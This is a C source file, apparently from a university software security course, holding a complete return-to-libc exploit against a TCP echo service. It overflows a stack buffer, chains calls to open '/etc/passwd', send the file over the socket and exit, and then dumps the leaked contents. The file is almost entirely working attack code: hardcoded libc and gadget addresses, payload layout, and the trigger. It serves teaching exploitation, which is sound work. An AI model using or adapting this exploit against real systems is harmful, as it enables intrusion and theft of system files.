/*
 * TCP-based Echo Service exploit
 *  - Method: return-to-libc (ret2libc)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define	ECHO_ADDR_DFL	"127.0.0.1"	/* default IPv4 server address	*/
#define ECHO_PORT_DFL	7777	/* default Echo Protocol port (TCP)	*/
#define	BUF_SZ		1024	/* buffer size */

/* 
 * payload stuff (return-to-libc; ret2libc)
 *
 * ret2libc chaining & %esp lifting:
 * 	open("/etc/passwd") -> sendfile(file, socket, NULL, UINT_MAX) -> exit(0)
 */
#define	VULN_BUF_SZ	512
#define	OPEN_ADDR	"\xf0\x48\xe9\xb7"
#define	OPEN_A1		"\x60\xfe\xff\xbf"
#define	OPEN_A2		"\x00\x00\x00\x00"
#define	OPEN_A3		"\x00\x00\x00\x00"
#define	SENDFILE_ADDR	"\x30\xc3\xe9\xb7"
#define	SENDFILE_A1	"\x04\x00\x00\x00"
#define	SENDFILE_A2	"\x05\x00\x00\x00"
#define	SENDFILE_A3	"\x00\x00\x00\x00"
#define	SENDFILE_A4	"\xff\xff\xff\xff"
#define	EXIT_ADDR	"\xe0\xc7\xde\xb7"
#define	EXIT_A1		"\x00\x00\x00\x00"
#define	ESP_LIFT1_ADDR	"\x62\x35\xde\xb7"
#define	ESP_LIFT2_ADDR	"\xa0\x63\xdd\xb7"
#define	RET_ADDR1_OFF	(VULN_BUF_SZ + 16)
#define	RET_ADDR2_OFF	(RET_ADDR1_OFF + 4)
#define	RET_ADDR3_OFF	(RET_ADDR2_OFF + 16)
#define	RET_ADDR4_OFF	(RET_ADDR3_OFF + 4)
#define	RET_ADDR5_OFF	(RET_ADDR4_OFF + 32)
#define	OPEN_A1_OFF	(RET_ADDR2_OFF + 4)
#define	OPEN_A2_OFF	(OPEN_A1_OFF + 4)
#define	OPEN_A3_OFF	(OPEN_A2_OFF + 4)
#define	SENDFILE_A1_OFF	(RET_ADDR4_OFF + 4)
#define	SENDFILE_A2_OFF	(SENDFILE_A1_OFF + 4)
#define	SENDFILE_A3_OFF	(SENDFILE_A2_OFF + 4)
#define	SENDFILE_A4_OFF	(SENDFILE_A3_OFF + 4)
#define	EXIT_A1_OFF	(RET_ADDR5_OFF + 8)
#define PATHNAME_OFF	(EXIT_A1_OFF + 4)
#define PATHNAME	"/etc/passwd"
#define NUL		0x0

/* cleanup routine */
static void
cleanup(int srv_fd)
{
	/* socket cleanup			*/
	if (srv_fd != -1)
		close(srv_fd);
}

/* server handler */
static void
srv_hndl(int sfd)
{
	/* payload buffer			*/
	char buf[BUF_SZ];

	/* length pointer			*/
	ssize_t len;

	/* verbose				*/
	fprintf(stdout, "[+] Preparing the payload... ");

	/* cleanup				*/	
	memset(buf, NUL, BUF_SZ);

	/* prepare the payload 			*/
	memcpy(buf + RET_ADDR1_OFF, OPEN_ADDR, sizeof(OPEN_ADDR) - 1);
	memcpy(buf + RET_ADDR2_OFF, ESP_LIFT1_ADDR, sizeof(ESP_LIFT1_ADDR) - 1);
	memcpy(buf + OPEN_A1_OFF, OPEN_A1, sizeof(OPEN_A1) - 1);
	memcpy(buf + OPEN_A2_OFF, OPEN_A2, sizeof(OPEN_A2) - 1);
	memcpy(buf + OPEN_A3_OFF, OPEN_A3, sizeof(OPEN_A3) - 1);
	memcpy(buf + RET_ADDR3_OFF, SENDFILE_ADDR, sizeof(SENDFILE_ADDR) - 1);
	memcpy(buf + RET_ADDR4_OFF, ESP_LIFT2_ADDR, sizeof(ESP_LIFT2_ADDR) - 1);
	memcpy(buf + SENDFILE_A1_OFF, SENDFILE_A1, sizeof(SENDFILE_A1) - 1);
	memcpy(buf + SENDFILE_A2_OFF, SENDFILE_A2, sizeof(SENDFILE_A2) - 1);
	memcpy(buf + SENDFILE_A3_OFF, SENDFILE_A3, sizeof(SENDFILE_A3) - 1);
	memcpy(buf + SENDFILE_A4_OFF, SENDFILE_A4, sizeof(SENDFILE_A4) - 1);
	memcpy(buf + RET_ADDR5_OFF, EXIT_ADDR, sizeof(EXIT_ADDR) - 1);
	memcpy(buf + EXIT_A1_OFF, EXIT_A1, sizeof(EXIT_A1) - 1);
	memcpy(buf + PATHNAME_OFF, PATHNAME, strlen(PATHNAME) + 1);
	
	/* verbose				*/
	fprintf(stdout, "[SUCCESS]\n"); fflush(stdout);	
	fprintf(stdout, "[+] Triggering the exploit... ");

	/* trigger the vulnerability		*/
	write(sfd, buf, PATHNAME_OFF + strlen(PATHNAME) + 1);
	
	/* verbose				*/
	fprintf(stdout, "[w00t!]\n"); fflush(stdout);
	
	/* dump the result to stderr(3)		*/
	while ((len = read(sfd, buf, BUF_SZ)) > 0)
		write(STDERR_FILENO, buf, len);
}

int
main(int argc, char **argv)
{
	/* socket descriptor; server		*/
	int sfd = -1;

	/* IPv4 address; server			*/
	struct sockaddr_in
		sin = {
			.sin_family	= AF_INET,
			.sin_port	= 
				((argc > 2 && argv[2]) ?
				htons((in_port_t)strtoul(argv[2], NULL, 10)) :
				htons(ECHO_PORT_DFL)),
			.sin_addr	= 
				{ ((argc > 1 && argv[1]) ?
				inet_addr(argv[1]) :
				inet_addr(ECHO_ADDR_DFL)) },
		};

	/* verbose				*/
	fprintf(stdout, "[+] Creating socket... ");

	/* get the connecting socket		*/
	if ((sfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
		/* failed			*/
		fprintf(stdout, "[FAILURE]\n"); fflush(stdout);	
		perror("[-] socket(2) failed");
		goto err;
	}

	/* verbose				*/
	fprintf(stdout, "[SUCCESS]\n"); fflush(stdout);	
	fprintf(stdout, "[+] Connecting to %s:%hu... ",
			inet_ntoa(sin.sin_addr),
			ntohs(sin.sin_port));

	/* connect to server			*/
	if (connect(sfd,
		(const struct sockaddr *)&sin,
		sizeof(struct sockaddr_in)) == -1) {
		/* failed			*/
		fprintf(stdout, "[FAILURE]\n"); fflush(stdout);	
		perror("[-] connect(2) failed");
		goto err;
	}

	/* verbose				*/
	fprintf(stdout, "[SUCCESS]\n"); fflush(stdout);	

	/* handle the server			*/
	srv_hndl(sfd);

	/* cleanup				*/
	cleanup(sfd);

	/* done; success			*/
	return EXIT_SUCCESS;

	/* error handling			*/
err:
	/* cleanup				*/
	cleanup(sfd);
	
	/* done; error 				*/
	return EXIT_FAILURE;
}
